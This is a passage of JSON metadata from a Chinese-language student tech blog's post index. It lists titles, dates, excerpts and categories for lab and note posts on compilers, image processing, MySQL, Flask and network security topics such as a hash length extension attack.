Graphics","slug":"Computer-Graphics","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/"},{"name":"Lab","slug":"Computer-Graphics/Lab","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"四则运算及LL1语法检测器","date":"2019-11-06T22:37:06.000Z","path":"posts/de411970/","slug":"四则运算及LL1语法检测器","permalink":"https://hejueyun.github.io/posts/de411970/","excerpt":"主要实现： 从零实现语法分析first、follow集 检测四则运算语法正确性 对任意输入语法，检测是否符合LL(1)语法 tkinter实现GUI 不完全实现警告： 不支持带空格的四则运算，但你可以 很轻易地 改为支持","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Lab","slug":"Compiler-Construction/Lab","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"编译原理备忘录-语法分析与词法分析","date":"2019-11-01T22:38:47.000Z","path":"posts/6255/","slug":"编译原理备忘录-语法分析与词法分析","permalink":"https://hejueyun.github.io/posts/6255/","excerpt":"1. 文法2. 相关概念 规则（产生式）：形如$a\\rightarrow b$ ,$a::&#x3D;b$，a为产生式左部，b为右部 候选式：${b_i|a\\rightarrow b_i }$ 文法G：四元组$(V_N,V_T,P,S)$: $V_N$:非终结符，一般用大写字符标识（A,B） $V_T$:终结符，一般用小写字符（a,b,c） $P$:规则 $S$:识别符&#x2F;开始符 推导： 直接推导&#x3D;&#x3D;归约。eg: a-&gt;b是文法G的规则，有m,n属于字符集，存在v=man w=mbn，则说w是v的直接推导，w归约到v。$v\\Rightarrow w$ $v{\\Rightarrow}^{+}w$： $v\\Rightarrow w_1 \\Rightarrow w_2…\\Rightarrow w_n$ $v{\\Rightarrow}^{*}w$：$v{\\Rightarrow}^{+}w$或$v&#x3D;w$ 句型：文法G，有x是从识别符开始推导得到，即$S\\Rightarrow^{+}x$，则x是G的句型，若x仅由终结符组成，则x称为句子 一句话：只由终结符组成的句型称为句子 语言：${x|S&#x3D;&gt;x,x{\\in}V_T}$ 空串 ε是指某个包含非终结符号的文法符号串的推导为空，例如A-&gt;ε。咋看上去和空集好像差不多，其实它们却有本质的区别：空集是面向结果的，即一个文法所有可能推导的最终语句；而ε则是面向定义的，即某个非终结符号可以推导为空，这样的定义可以在推导过程重复使用。 2.1. 叶子结点——短语、句柄与集族 > 短语、简单短语都是**针对某一句型**的，是**相对于某个非终结符号**的，并且**任何句型本身一定是相对于识别符号Z的短语。** > > 句柄**：任一句型的最左简单短语称为该句型的句柄，一个句型只有一个句柄。** - 短语: $T * F$, $E+T * F$ - 直接短语（简单短语）：$T * F$ - 句柄：$T * F$ 对于子树$T$来说，其所有叶子节点为：$T * F$，对于$E$来说，其所有叶子节点为:$E+T *F$故短语为$T * F$和 $E+T * F$ 集族 集族是一种特殊的集合，以集合为元素的集合称为集族。例如，集A的幂集P(A)是一个集族，P(P(A))，P(P(P(A))都是集族。又例如，由空集φ、集合A&#x3D;{1，2，3}作为元素的集合M&#x3D;{φ，A}是一个集族。 3. 文法类型","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Notes","slug":"Compiler-Construction/Notes","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"mysql备忘录","date":"2019-10-30T19:25:57.000Z","path":"posts/49760/","slug":"mysql备忘录","permalink":"https://hejueyun.github.io/posts/49760/","excerpt":"前言：今天要用mysql时突然发现自己都要忘完了，sad","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Notes","slug":"Sql/Notes","permalink":"https://hejueyun.github.io/categories/Sql/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"正则式到dfa最小化实现","date":"2019-10-30T10:56:49.000Z","path":"posts/7117/","slug":"正则式到dfa最小化实现","permalink":"https://hejueyun.github.io/posts/7117/","excerpt":"python实现： re到NFA NFA到DFA DFA最小化 注：1.非完全实现，不支持[a-zA-Z] （当然如果需要的话也可以很轻松地改为完全实现）2.存储变量的数据结构设计很糟糕..","categories":[{"name":"Compiler Construction","slug":"Compiler-Construction","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/"},{"name":"Lab","slug":"Compiler-Construction/Lab","permalink":"https://hejueyun.github.io/categories/Compiler-Construction/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"实验:图像处理:pnsr~q曲线","date":"2019-10-13T16:12:13.000Z","path":"posts/37840/","slug":"python图像处理-psnr-q曲线","permalink":"https://hejueyun.github.io/posts/37840/","excerpt":"1. python图像处理：psnr~q曲线绘制本文实现jpeg压缩量化因子，与JPEG压缩前后图像峰值信噪比的函数关系","categories":[{"name":"Computer Graphics","slug":"Computer-Graphics","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/"},{"name":"Lab","slug":"Computer-Graphics/Lab","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"VirtualBox网络攻防环境搭建","date":"2019-07-18T22:53:36.000Z","path":"posts/17448/","slug":"VirtualBox网络攻防环境搭建","permalink":"https://hejueyun.github.io/posts/17448/","excerpt":"1. 实验目的 实现虚拟硬盘的多重加载 搭建虚拟机之间的拓扑网络","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"哈希长度扩展攻击","date":"2019-07-18T22:53:36.000Z","path":"posts/60830/","slug":"哈希长度扩展攻击","permalink":"https://hejueyun.github.io/posts/60830/","excerpt":"1. 哈希长度扩展攻击实验 本博客内容旨在技术学习交流，仅供学习参考之用，请勿用于任何非法用途，否则后果作者概不负责 本文主要介绍哈希长度攻击的主要流程与具体实现 参照： 实验步骤介绍 Hash_extender作者讲解攻击原理","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Network Security","slug":"Security/Network-Security","permalink":"https://hejueyun.github.io/categories/Security/Network-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"flask实现图片上传处理","date":"2019-05-30T17:23:05.000Z","path":"posts/47117/","slug":"flask实现图片上传处理","permalink":"https://hejueyun.github.io/posts/47117/","excerpt":"本demo实现将图片上传，利用 PIL库在网页端进行图像处理，并作结果展示","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Web","slug":"Program-Language/Python/Web","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Web/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://hejueyun.github.io/tags/Flask/"}]},{"title":"实验:powershell文本格式化及mysql导入","date":"2019-05-30T15:38:01.000Z","path":"posts/26782/","slug":"powershell文本格式化及mysql导入","permalink":"https://hejueyun.github.io/posts/26782/","excerpt":"本demo不存在太大的实用价值，仅作为学习powershell的一个例子","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Lab","slug":"Sql/Lab","permalink":"https://hejueyun.github.io/categories/Sql/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"},{"name":"Shell","slug":"Shell","permalink":"https://hejueyun.github.io/tags/Shell/"}]},{"title":"bs4-pymsql-flask结构搭建","date":"2019-04-29T22:03:11.000Z","path":"posts/5977/","slug":"bs4-pymysql-flask结构搭建","permalink":"https://hejueyun.github.io/posts/5977/","excerpt":"本实验实现一个爬虫展示demo，其中爬虫部分使用beautifulsoup解析，pymysql实现数据库写入，SQLAlchemy实现数据库读出，flask实现网页端展示。","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Web","slug":"Program-Language/Python/Web","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Web/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://hejueyun.github.io/tags/Flask/"}]},{"title":"[翻譯]Depth perception","date":"2019-04-23T13:50:22.000Z","path":"posts/32311/","slug":"【翻譯】Depth-perception","permalink":"https://hejueyun.github.io/posts/32311/","excerpt":"本文選譯自維基百科Depth perception 【】：表示原文的補充説明 （）：表示譯者自行的補充説明 因“雙目深度”一部分與攝影關係較淺，故未進行翻譯 侵刪","categories":[],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"图像增强处理-直方图均衡化与规定化","date":"2019-04-22T18:21:13.000Z","path":"posts/51168/","slug":"图像增强处理-直方图均衡化与规定化","permalink":"https://hejueyun.github.io/posts/51168/","excerpt":"本方法用c&#x2F;cpp实现，不依赖于opencv库","categories":[{"name":"Computer Graphics","slug":"Computer-Graphics","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/"},{"name":"Lab","slug":"Computer-Graphics/Lab","permalink":"https://hejueyun.github.io/categories/Computer-Graphics/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]}]